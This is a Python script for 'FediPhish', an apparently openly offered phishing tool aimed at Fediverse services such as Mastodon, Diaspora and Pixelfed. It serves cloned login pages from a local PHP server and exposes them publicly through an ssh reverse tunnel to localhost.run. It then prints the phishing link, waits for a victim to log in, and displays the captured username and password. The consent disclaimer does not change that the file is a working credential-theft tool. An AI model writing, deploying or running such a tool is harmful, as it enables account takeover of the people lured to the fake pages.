#!/bin/python3
from subprocess import Popen as bg_cmd,DEVNULL,getoutput as bg_cmd_output
import time,os

#=================
class doge:
    bgred='\033[41m'
    black = '\033[30m'
    green = '\033[32m'
    yellow = '\033[93m'
    lightblue='\033[36m'
    red = '\033[31m'
    bold = '\033[01m'
    reset = '\033[0m'

def col_info(text,defe='\n'):
    print(f"{doge.lightblue}{doge.bold}[Info]{doge.reset}{doge.bold} {text}",end=defe)

def col_exit(text):
    print(f"\n{doge.red}{doge.bold}[Exit] {text}{doge.reset}")

def col_selected(text):
    print(f"\n{doge.yellow}{doge.bold}[Selected] {text}{doge.reset}")

#======================
def banner():
    print('''
\033[40m\033[31m\033[01m* _____        _ _ ____  _     _     _     *
 |  ___|__  __| (_)  _ \| |__ (_)___| |__   
 | |_ / _ \/ _` | | |_) | '_ \| / __| '_ \  
 |  _|  __/ (_| | |  __/| | | | \__ \ | | | 
 |_|  \___|\__,_|_|_|   |_| |_|_|___/_| |_| 
*                                          *
  Phish the Fediverse :)                    
         v1.1    @1337kid   doge xD         \033[0m''')

def intro():
    banner()
    print('''
\033[41m\033[01m\033[93mUsage of FediPhish for attacking targets
without prior mutual consent is illegal.\033[0m''')

def startup():
    bg_cmd('rm -r $HOME/.FediPhish/server && mkdir $HOME/.FediPhish/server',shell=True,stderr=DEVNULL,stdout=DEVNULL)

def stop_services():
    bg_cmd('killall -9 ssh && killall -2 php',shell=True,stderr=DEVNULL,stdout=DEVNULL)

def move_files(web):
    bg_cmd('cp -r $HOME/.FediPhish/web/'+web+'/* $HOME/.FediPhish/server',shell=True,stderr=DEVNULL,stdout=DEVNULL)
    bg_cmd('cp $HOME/.FediPhish/web/login.php $HOME/.FediPhish/server',shell=True,stderr=DEVNULL,stdout=DEVNULL)

def web_list():
    print('\n\033[01m\033[35mAvailable phishing modules\033[0m\033[01m')
    print('+'+'-'*30+'+')
    print('[1] Diaspora\t[4] Mastodon\n[2] GNU-Social\t[5] Pixelfed\n[3] Hubzilla\t[6] Socialhome')
    print('+'+'-'*30+'+')
    print('[99] Exit')
    while 1:
        ch=input('\n\033[35mFediPhish>\033[0m ')
        if ch in ['1','2','3','4','5','6','99']:
            break
        else:
            print('\033[31m\033[01mInvalid')
    if ch=='1':
        selected='Diaspora'
    elif ch=='2':
        selected='GNU-Social'
    elif ch=='3':
        selected='Hubzilla'
    elif ch=='4':
        selected='Mastodon'
    elif ch=='5':
        selected='Pixelfed'
    elif ch=='6':
        selected='Socialhome'
    elif ch=='99':
        exit()
    return selected

def start_server(selected,port='36012'):
    move_files(selected)
    os.system('clear')
    banner()
    col_selected(selected)
    col_info('Starting php server [localhost:'+port+']...','')
    bg_cmd('php -S localhost:'+port+' -t $HOME/.FediPhish/server',shell=True,stderr=DEVNULL,stdout=DEVNULL)
    print('\33[92m'+' done'+'\33[0m')
    col_info('Exposing localhost:'+port+' to the Internet...','')
    print(end='',flush=True)
    bg_cmd('sh -c "ssh -o StrictHostKeyChecking=no -R 80:localhost:'+port+' nokey@localhost.run 2>/dev/null 1> $HOME/.FediPhish/server/link" &',shell=True,stderr=DEVNULL,stdout=DEVNULL)
    time.sleep(8)
    print('\33[92m'+' done'+'\33[0m')
    link = bg_cmd_output('grep -o "https://[0-9a-z]*\.lhrtunnel.link" $HOME/.FediPhish/server/link')
    link_text=f'Link: {link}'
    col_info(link_text)
    col_info('Waiting for target to login')
    
def get_creds():
    col_info('Credentials found')
    f=open(os.environ['HOME']+'/.FediPhish/server/creds.txt').readlines()
    print(f'[Username] : {f[0].strip()}\n[Password] : {f[1].strip()}')

#=================================
try:
    os.system('clear')
    startup()
    stop_services()
    intro()
    selected = web_list()
    col_info('Enter port (default = 36012):')
    s_port=input()
    if s_port=='':
        start_server(selected)
    else:
        start_server(selected,s_port)
    #================
    while 1:
        cr = os.path.exists(os.environ['HOME']+'/.FediPhish/server/creds.txt')
        if cr==True:
            break
    #================
    get_creds()
    stop_services()

except KeyboardInterrupt:
    col_exit('KeyboardInterrupt')
